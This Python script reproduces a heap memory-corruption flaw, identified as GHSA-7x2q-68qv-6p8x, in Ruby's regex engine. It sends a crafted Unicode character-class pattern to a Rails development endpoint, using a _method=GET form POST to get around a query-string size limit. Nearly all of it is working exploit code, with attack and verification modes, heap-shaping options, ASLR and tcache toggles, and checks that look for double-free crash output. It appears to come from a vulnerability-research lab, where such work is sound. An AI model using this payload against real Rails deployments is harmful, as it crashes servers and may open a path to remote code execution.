#!/usr/bin/env python3
"""Wire-only GHSA-7x2q-68qv-6p8x reproducer on stock Rails.

Rails 8.1.4.1's development-only /rails/info/notes endpoint interpolates the
attacker-controlled tag into Regexp literals in
railties/lib/rails/source_annotation_extractor.rb:102-119.  A form POST with
_method=GET reaches that GET route without Puma's 10 KiB query-string limit.

Usage:
  python3 lab/repro/ruby2shell-regexp-notes-wire.py attack|safe|fixed|asan [tag]

No application, middleware, debugger, memory oracle, or marker is used. The
only non-stock condition is selecting the affected/fixed/ASan Ruby build.
Set RUBY2SHELL_REGEXP_RUBY to select another build and
RUBY2SHELL_REGEXP_GEM_PATH to override its gem home. Without an override the
matching installed gem directory is selected; the ASan mode uses the plain
3.4.12 gem home because its native extensions are ABI-compatible.
"""

from __future__ import annotations

import http.client
import json
import os
from pathlib import Path
import platform
import resource
import subprocess
import sys
import time
from urllib.parse import urlencode

ROOT = Path(__file__).resolve().parents[2]
EV = ROOT / "lab/build/evidence"
APP = ROOT / "lab/build/rails-stock-app"
RUBY12 = ROOT / "lab/build/plain/ruby-3.4.12-plain/bin/ruby"
RUBY13 = ROOT / "lab/build/plain/ruby-3.4.13-plain/bin/ruby"
RUBY12_ASAN = ROOT / "lab/build/ruby-3.4.12-asan/bin/ruby"


def no_core() -> None:
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))


def malicious_tag(nested_extras: int = 0) -> str:
    # 9,999 disjoint two-codepoint ranges cross ONIG_MAX_MULTI_BYTE_RANGES_NUM
    # only on the second && intersection, after cc->mbuf was freed once.
    chars = "".join(chr(0x4E00 + 2 * i) for i in range(9_999))
    extra_codepoints = []
    codepoint = 0xA000
    for _ in range(nested_extras):
        while 0xD800 <= codepoint <= 0xDFFF:
            codepoint += 0x100
        extra_codepoints.append(codepoint)
        codepoint += 0x100
    extra = "".join(f"\\u{{{codepoint:X}}}" for codepoint in extra_codepoints)
    return "(?i:[[:^ascii:][^" + chars + "]&&[^\\u9fff" + extra + "]&&x])"


def wait_ready(proc: subprocess.Popen, port: int) -> bool:
    for _ in range(300):
        if proc.poll() is not None:
            return False
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=1)
            conn.request("GET", "/up")
            response = conn.getresponse()
            response.read()
            conn.close()
            return response.status == 200
        except OSError:
            time.sleep(0.1)
    return False


def health(port: int) -> int | str:
    try:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
        conn.request("GET", "/up")
        response = conn.getresponse()
        response.read()
        conn.close()
        return response.status
    except OSError as exc:
        return type(exc).__name__


def main() -> int:
    mode = sys.argv[1] if len(sys.argv) > 1 else "attack"
    tag = sys.argv[2] if len(sys.argv) > 2 else f"regexp-notes-{mode}"
    if mode not in {"attack", "safe", "fixed", "asan", "calibrate"}:
        raise SystemExit("usage: ruby2shell-regexp-notes-wire.py attack|safe|fixed|asan|calibrate [tag]")
    if not (APP / "config/environment.rb").is_file():
        raise SystemExit("missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh")

    ruby_override = os.environ.get("RUBY2SHELL_REGEXP_RUBY")
    ruby = Path(ruby_override) if ruby_override else RUBY13 if mode == "fixed" else RUBY12_ASAN if mode == "asan" else RUBY12
    if not ruby.is_absolute():
        ruby = ROOT / ruby
    if not ruby.is_file():
        raise SystemExit(f"missing Ruby build: {ruby}")

    port = int(os.environ.get("RUBY2SHELL_REGEXP_PORT", "4600"))
    env = os.environ.copy()
    gem_path_override = os.environ.get("RUBY2SHELL_REGEXP_GEM_PATH")
    if gem_path_override:
        gem_path = Path(gem_path_override)
        if not gem_path.is_absolute():
            gem_path = ROOT / gem_path
    elif mode == "asan" and ruby == RUBY12_ASAN:
        gem_path = ROOT / "lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
    else:
        gem_dirs = sorted(
            path for path in (ruby.parent.parent / "lib/ruby/gems").glob("[0-9]*.[0-9]*.0") if path.is_dir()
        )
        if len(gem_dirs) != 1:
            raise SystemExit(f"cannot select gem path for {ruby}: {gem_dirs}")
        gem_path = gem_dirs[0]
    env["GEM_PATH"] = str(gem_path) + ((":" + env["GEM_PATH"]) if env.get("GEM_PATH") else "")
    if mode == "asan":
        env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1"
        env["UBSAN_OPTIONS"] = "halt_on_error=0:print_stacktrace=0"
    if os.environ.get("RUBY2SHELL_REGEXP_TCACHE0"):
        env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_count=0"

    EV.mkdir(parents=True, exist_ok=True)
    log_path = EV / f"{tag}.server.log"
    result_path = EV / f"{tag}.json"
    response_path = EV / f"{tag}.response"
    maps_path = EV / f"{tag}.maps"
    pid_path = EV / f"{tag}.pid"
    arm_path = EV / f"{tag}.arm"
    nested_extras = int(os.environ.get("RUBY2SHELL_REGEXP_NESTED_EXTRAS", "0"))
    pattern = "TODO" if mode == "safe" else malicious_tag(nested_extras)
    names = int(os.environ.get("RUBY2SHELL_REGEXP_NAMES", "0"))
    name_len = int(os.environ.get("RUBY2SHELL_REGEXP_NAME_LEN", "15"))
    safe_prefix = int(os.environ.get("RUBY2SHELL_REGEXP_SAFE_PREFIX", "0"))
    primer_k = int(os.environ.get("RUBY2SHELL_REGEXP_PRIMER_K", "0"))
    primer = os.environ.get("RUBY2SHELL_REGEXP_PRIMER", "")
    extra_params = int(os.environ.get("RUBY2SHELL_REGEXP_EXTRA_PARAMS", "0"))
    extra_len = int(os.environ.get("RUBY2SHELL_REGEXP_EXTRA_LEN", "0"))
    request_path = os.environ.get("RUBY2SHELL_REGEXP_PATH", "/rails/info/notes")
    if primer_k:
        primer = "|".join(["[[:^ascii:][^一]&&x]"] * primer_k)
    if names:
        if not 6 <= name_len <= 19:
            raise SystemExit("RUBY2SHELL_REGEXP_NAME_LEN must be 6..19")
        pattern = "".join(
            f"(?<n{i:04d}{'A' * (name_len - 5)}>x)" for i in range(names)
        ) + pattern
    if safe_prefix:
        pattern = "[[:^ascii:][^一]&&x]" * safe_prefix + pattern
    jemtrace = bool(os.environ.get("RUBY2SHELL_REGEXP_JEMTRACE"))
    trace = bool(os.environ.get("RUBY2SHELL_REGEXP_TRACE")) or jemtrace
    if trace:
        arm_path.unlink(missing_ok=True)
        if jemtrace:
            env["LD_PRELOAD"] = str(ROOT / "lab/preload/jemregtrace.so") + ":libjemalloc.so.2"
            env["JEMREGTRACE_FD"] = "2"
            env["JEMREGTRACE_ARM"] = str(arm_path)
        else:
            env["LD_PRELOAD"] = str(ROOT / "lab/preload/regtrace.so") + (
                (":" + env["LD_PRELOAD"]) if env.get("LD_PRELOAD") else ""
            )
            env["REGTRACE_FD"] = "2"
            env["REGTRACE_ARM"] = str(arm_path)
    fields = [("_method", "GET"), ("tag", pattern)]
    fields.extend((f"x{i}", "x" * extra_len) for i in range(extra_params))
    body = urlencode(fields).encode()
    primer_body = urlencode({"_method": "GET", "tag": primer}).encode() if primer else b""

    command = [str(ruby), str(APP / "bin/rails"), "server", "-b", "127.0.0.1", "-p", str(port), "--pid", str(pid_path)]
    if os.environ.get("RUBY2SHELL_REGEXP_ASLR_OFF"):
        command = ["setarch", platform.machine(), "-R"] + command
    with log_path.open("wb") as log:
        proc = subprocess.Popen(
            command,
            cwd=ROOT,
            env=env,
            stdout=log,
            stderr=subprocess.STDOUT,
            preexec_fn=no_core,
        )
        result: dict[str, object] = {
            "mode": mode,
            "tag": tag,
            "ruby": str(ruby.relative_to(ROOT)) if ruby.is_relative_to(ROOT) else str(ruby),
            "port": port,
            "ruby_override": ruby_override,
            "gem_path": str(gem_path.relative_to(ROOT)) if gem_path.is_relative_to(ROOT) else str(gem_path),
            "names": names,
            "name_len": name_len,
            "safe_prefix": safe_prefix,
            "nested_extras": nested_extras,
            "primer_k": primer_k,
            "primer_bytes": len(primer.encode()),
            "extra_params": extra_params,
            "extra_len": extra_len,
            "request_path": request_path,
            "trace": trace,
            "jemtrace": jemtrace,
            "tcache0": bool(os.environ.get("RUBY2SHELL_REGEXP_TCACHE0")),
            "aslr_off": bool(os.environ.get("RUBY2SHELL_REGEXP_ASLR_OFF")),
            "pattern_bytes": len(pattern.encode()),
            "body_bytes": len(body),
        }
        try:
            result["ready"] = wait_ready(proc, port)
            if result["ready"]:
                try:
                    maps_path.write_text(Path(f"/proc/{proc.pid}/maps").read_text())
                except OSError:
                    pass
                started = time.monotonic()
                if trace:
                    arm_path.touch()
                try:
                    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=float(os.environ.get("RUBY2SHELL_REGEXP_TIMEOUT", "90")))
                    if primer:
                        conn.request(
                            "POST",
                            request_path,
                            body=primer_body,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Content-Length": str(len(primer_body)),
                            },
                        )
                        primer_response = conn.getresponse()
                        primer_data = primer_response.read()
                        result["primer_http_status"] = primer_response.status
                        result["primer_response_bytes"] = len(primer_data)
                    conn.request(
                        "POST",
                        request_path,
                        body=body,
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Content-Length": str(len(body)),
                        },
                    )
                    response = conn.getresponse()
                    data = response.read()
                    response_path.write_bytes(data)
                    result["http_status"] = response.status
                    result["response_bytes"] = len(data)
                    conn.close()
                except OSError as exc:
                    result["request_error"] = repr(exc)
                result["request_seconds"] = round(time.monotonic() - started, 3)
                time.sleep(0.2)
                result["exit_after_request"] = proc.poll()
                result["health"] = health(port)
        finally:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
            pid_path.unlink(missing_ok=True)
    server_log = log_path.read_text(errors="replace")
    result["server_log_tail"] = server_log[-2_000:]
    if mode == "calibrate":
        ok = result.get("ready") is True
    elif mode == "asan":
        ok = (
            result.get("request_error") is not None
            and result.get("exit_after_request") not in (None, 0)
            and "ERROR: AddressSanitizer: heap-use-after-free" in server_log
            and "bbuf_free" in server_log
        )
    elif mode == "attack":
        ok = (
            result.get("request_error") is not None
            and result.get("exit_after_request") not in (None, 0)
            and any(
                diagnostic in server_log
                for diagnostic in (
                    "bbuf_free",
                    "double free",
                    "corrupted",
                    "free(): invalid size",
                    "free(): invalid pointer",
                    "munmap_chunk(): invalid pointer",
                )
            )
        )
    elif mode == "safe":
        ok = result.get("http_status") == 200 and result.get("health") == 200
    else:
        ok = (
            result.get("http_status") == 500
            and result.get("health") == 200
            and "too many multibyte code ranges" in server_log
        )
    result["expected_observed"] = ok
    result_path.write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps({k: v for k, v in result.items() if k != "server_log_tail"}, indent=2))
    if not ok:
        print(server_log[-2_000:], file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
